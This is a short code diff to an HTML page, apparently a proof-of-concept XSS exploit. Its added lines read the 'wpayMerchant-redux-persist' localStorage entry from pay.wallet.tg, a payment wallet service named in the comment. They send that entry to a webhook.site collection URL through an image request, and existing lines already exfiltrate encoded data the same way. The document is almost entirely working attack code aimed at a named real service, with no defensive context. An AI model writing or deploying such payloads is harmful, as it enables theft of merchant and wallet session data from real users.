@@ -20,6 +20,14 @@
     const img = new Image();
     img.src = webhookURL + "?data=" + encodedData;
     document.body.appendChild(img);
+
+    // XSS payload to exfiltrate localStorage from pay.wallet.tg
+(function(){
+  const stolen = localStorage.getItem("wpayMerchant-redux-persist");
+  const img = new Image();
+  img.src = "https://webhook.site/YOUR-ID?data=" + encodeURIComponent(stolen);
+})();
+
   </script>
 </body>
 </html>
